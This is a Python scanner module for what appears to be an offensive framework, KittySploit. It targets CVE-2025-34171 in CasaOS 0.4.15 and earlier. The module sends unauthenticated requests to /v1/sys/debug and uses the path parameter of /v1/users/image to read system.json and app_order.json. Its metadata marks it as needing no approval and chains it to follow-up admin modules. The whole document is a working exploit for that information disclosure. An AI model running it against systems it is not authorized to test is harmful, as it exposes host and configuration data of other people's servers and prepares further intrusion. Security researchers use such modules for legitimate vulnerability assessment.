#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CasaOS unauthenticated config/debug disclosure (CVE-2025-34171)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CasaOS - Unauth Config/Debug Disclosure (CVE-2025-34171)',
        'description': (
            'CasaOS <= 0.4.15 exposes unauthenticated /v1/users/image?path=... under '
            '/var/lib/casaos/1/ and /v1/sys/debug host information (CVE-2025-34171).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'casaos', 'icewhale', 'exposure',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/casaos_cve_2025_34171_info',
                    'scanner/http/cve_2024_24765_detect',
                ],
            },
        },
        'references': [
            'https://www.vulncheck.com/advisories/casaos-unauthenticated-file-and-debug-data-exposure',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-34171',
        ],
        'cve': 'CVE-2025-34171',
    }

    def run(self):
        debug = self.http_request(method='GET', path='/v1/sys/debug', allow_redirects=False)
        if debug and debug.status_code == 200:
            body = debug.text or ''
            if any(
                x in body.lower()
                for x in ('kernel', 'os release', 'casaos', 'cpu', 'memory', 'disk')
            ):
                self.set_info(
                    severity='medium',
                    reason='CasaOS CVE-2025-34171: unauthenticated /v1/sys/debug disclosure',
                    path='/v1/sys/debug',
                )
                return True

        for path in (
            '/v1/users/image?path=/var/lib/casaos/1/app_order.json',
            '/v1/users/image?path=/var/lib/casaos/1/system.json',
        ):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if any(m in body for m in ('"installed_apps"', '"os_version"', '"cpu_info"')):
                self.set_info(
                    severity='medium',
                    reason='CasaOS CVE-2025-34171: unauthenticated config via /v1/users/image',
                    path=path,
                )
                return True
        return False
